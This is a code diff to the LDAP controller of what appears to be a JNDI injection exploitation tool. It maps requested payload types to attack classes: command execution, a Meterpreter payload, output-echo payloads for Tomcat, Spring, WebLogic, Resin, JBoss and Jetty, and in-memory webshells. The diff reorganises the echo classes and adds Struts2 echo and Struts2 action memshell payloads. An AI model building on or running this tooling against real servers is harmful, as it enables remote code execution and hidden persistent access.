@@ -11,19 +11,21 @@ import com.qi4l.jndi.template.*;
 import com.qi4l.jndi.template.Websphere.WSFMSFromThread;
 import com.qi4l.jndi.template.Websphere.WebsphereMemshellTemplate;
 import com.qi4l.jndi.template.Websphere.websphereEcho;
+import com.qi4l.jndi.template.echo.*;
 import com.qi4l.jndi.template.jboss.JBFMSFromContextF;
 import com.qi4l.jndi.template.jboss.JBSMSFromContextS;
-import com.qi4l.jndi.template.jboss.JbossEcho;
+import com.qi4l.jndi.template.echo.JbossEcho;
 import com.qi4l.jndi.template.jetty.JFMSFromJMXF;
 import com.qi4l.jndi.template.jetty.JSMSFromJMXS;
-import com.qi4l.jndi.template.jetty.jettyEcho;
+import com.qi4l.jndi.template.echo.jettyEcho;
 import com.qi4l.jndi.template.resin.RFMSFromThreadF;
 import com.qi4l.jndi.template.resin.RSMSFromThreadS;
-import com.qi4l.jndi.template.resin.resinEcho;
+import com.qi4l.jndi.template.echo.resinEcho;
 import com.qi4l.jndi.template.spring.SpringControllerMS;
 import com.qi4l.jndi.template.spring.SpringInterceptorMS;
+import com.qi4l.jndi.template.struts2.Struts2ActionMS;
 import com.qi4l.jndi.template.tomcat.*;
-import com.qi4l.jndi.template.weblogic.weblogicEcho;
+import com.qi4l.jndi.template.echo.weblogicEcho;
 import com.qi4l.jndi.gadgets.utils.ClassNameUtils;
 import com.qi4l.jndi.gadgets.utils.HexUtils;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
@@ -71,7 +73,7 @@ public class BasicController implements LdapController {
 
             // 根据不同的负载类型，设置className并处理
             switch (payloadType) {
-                case qi4l:
+                case command:
                     CommandTemplate commandTemplate = new CommandTemplate(params[0]);
                     commandTemplate.cache();
                     className = commandTemplate.getClassName();
@@ -80,10 +82,10 @@ public class BasicController implements LdapController {
                     className = Meterpreter.class.getName();
                     break;
                 case tomcatecho:
-                    className = TomcatEchoTemplate.class.getName();
+                    className = TomcatEcho.class.getName();
                     break;
                 case springecho:
-                    className = SpringEchoTemplate.class.getName();
+                    className = SpringEcho.class.getName();
                     break;
                 case weblogicecho:
                     className = weblogicEcho.class.getName();
@@ -93,6 +95,9 @@ public class BasicController implements LdapController {
                     break;
                 case resinecho:
                     className = resinEcho.class.getName();
+                    break;
+                case struts2echo:
+                    className = Struts2Echo.class.getName();
                     break;
                 case jbossecho:
                     className = JbossEcho.class.getName();
@@ -153,6 +158,9 @@ public class BasicController implements LdapController {
                     break;
                 case jettyservlet:
                     className = structureShell(JSMSFromJMXS.class);
+                    break;
+                case struts2actionms:
+                    className = structureShell(Struts2ActionMS.class);
                     break;
                 case wsfilter:
                     Config.init();
